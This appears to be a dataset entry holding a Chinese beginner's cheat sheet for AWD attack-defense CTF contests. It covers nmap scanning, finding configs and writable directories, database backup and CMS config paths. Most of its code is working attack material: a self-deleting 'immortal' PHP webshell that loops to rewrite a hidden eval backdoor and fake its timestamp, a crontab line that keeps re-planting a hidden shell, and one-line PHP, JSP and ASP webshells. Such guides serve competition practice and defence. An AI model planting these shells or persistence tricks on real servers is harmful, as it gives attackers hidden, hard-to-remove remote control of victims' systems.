---
title: AWD 比赛入门攻略总结
contest: AWD 入门
year: 2022
difficulty: easy
vuln_type: web_unknown
tags: [nmap扫描, nmap-sn, nmap-sV, nmap-sS, find配置文件, 不死马, PHP webshell, crontab 5分钟, mysqldump, DEDECMS配置, Wordpress配置, DiscuzX配置, PHPCMS配置, 端口关闭, find -mmin]
attack_chain:
  - nmap -sn 192.168.0.0/24 扫存活
  - nmap -sV 192.168.0.2 扫服务版本
  - nmap -sS -p 80,445 扫常用端口
  - find / -name "nginx.conf" 找 nginx
  - find /var/www/html -name *.php -mmin -20 看最近修改
  - 不死马: ignore_user_abort(true) + set_time_limit(0) + unlink(__FILE__) + while(1) file_put_contents + usleep(5000)
  - crontab 5 分钟反弹: echo "* * * * * echo ... shell" | crontab
  - mysqldump -u root -p password databasename > bak.sql
  - find / -type d -perm -002 找可写目录
  - find /var/www/html -name "*.php" | xargs grep "eval(" 找 webshell
  - 配置文件: DiscuzX2 \config\config_global.php + Wordpress \wp-config.php + DEDECMS5.7 \data\common.inc.php
key_payload: 'nmap -sn/-sV/-sS / find -name *.conf / 不死马 file_put_contents 5000usleep / crontab 5分钟 / mysqldump / -perm -002 / eval( webshell 查找'
one_liner: AWD 入门攻略 — nmap 扫存活+服务+端口 + find 配置文件 + 不死马 (usleep 5000) + crontab 5分钟反弹 + mysqldump + 找可写目录 + 找现有 webshell。
lesson: AWD 节奏是 1) 找后门 2) 写后门 3) 修后门 4) 拿 flag;不死马通过 usleep + while 循环 file_put_contents 防杀;crontab 5 分钟一轮是常见 scoring 周期;主流 CMS 配置路径要背熟。
quality: medium
---

# AWD 比赛入门攻略总结

## 速读
AWD 比赛全流程入门工具集 — 命令大全。

## 信息收集
```bash
nmap -sn 192.168.0.0/24              # 存活
nmap -sV 192.168.0.2                 # 服务版本
nmap -sS -p 80,445 192.168.0.2       # 端口
find / -name "nginx.conf"            # 配置
find /var/www/html -name *.php -mmin -20
find / -type d -perm -002            # 可写目录
```

## 不死马 (PHP)
```php
<?php
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = '2.php';
$code = '<?php if(md5($_GET["pass"])=="..."){@eval($_POST[a]);} ?>';
while (1) {
    file_put_contents($file, $code);
    system('touch -m -d "2018-12-01 09:10:12" .2.php');
    usleep(5000);
}
```

## crontab 反弹
```bash
echo "* * * * * echo '<?php ... ?>' > /var/www/html/.index.php" | crontab
```

## 数据库备份
```bash
mysqldump -u root -p password databasename > bak.sql
mysql -u root -p password database < bak.sql
```

## CMS 配置路径
- DiscuzX2: `\config\config_global.php`
- Wordpress: `\wp-config.php`
- Metinfo: `\include\head.php`
- PHPCMS V9: `\phpcms\base.php`
- DEDECMS5.7: `\data\common.inc.php`

## webshell 模板
- PHP: `<?php @eval($_POST['cmd']); ?>`
- JSP: `<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>`
- ASP: `<%eval request("cmd")%>`
